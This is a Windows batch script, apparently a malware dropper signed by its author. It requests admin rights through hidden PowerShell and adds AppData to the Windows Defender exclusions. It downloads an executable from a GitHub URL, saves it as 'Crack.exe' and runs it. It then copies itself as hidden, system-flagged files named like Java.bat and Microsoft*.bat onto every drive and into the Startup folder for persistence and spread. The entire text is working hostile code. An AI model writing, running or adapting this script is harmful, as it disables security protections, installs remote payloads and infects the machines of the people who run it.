@echo off
setlocal enabledelayedexpansion

:: ==== Check if already installed ====
set "CHECKFILE=%USERPROFILE%\AppData\Roaming\SubDir\System32.exe"
if exist "%CHECKFILE%" (
    exit /b
)

:: ==== Wait for Internet ====
:CheckInternet
ping -n 1 8.8.8.8 >nul 2>&1
if errorlevel 1 (
    timeout /t 5 /nobreak >nul >nul
    goto CheckInternet
)

:: ==== Admin Check ====
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

:: ==== Exclude AppData from Defender ====
set "APPDATA_PATH=%USERPROFILE%\AppData"
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"

:: ==== Download Payload ====
set "TARGET_FILE=%APPDATA_PATH%\Crack.exe"
set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/Client-built.exe"
powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
start "" "%TARGET_FILE%"

:: ==== Setup replication ====
set "SELF=%~f0"
set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

for %%D in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%D:\ (
        set "FOLDER_NAME=System %%D"
        set "TARGET_FOLDER=%%D:\!FOLDER_NAME!"
        set "DRIVE_BAT=%%D:\!FOLDER_NAME!\Java.bat"

        :: Create folder on drive
        mkdir "!TARGET_FOLDER!" >nul 2>&1

        :: Copy to drive and hide it
        copy "%SELF%" "!DRIVE_BAT!" >nul
        attrib +h +s "!TARGET_FOLDER!"
        attrib +h +s "!DRIVE_BAT!"

        :: Copy renamed to Startup folder
        set "RENAMED=Microsoft%%D.bat"
        copy "%SELF%" "%STARTUP_FOLDER%\!RENAMED!" >nul
        attrib +h "%STARTUP_FOLDER%\!RENAMED!"
    )
)

exit

:: By MrAboudi
:: v2
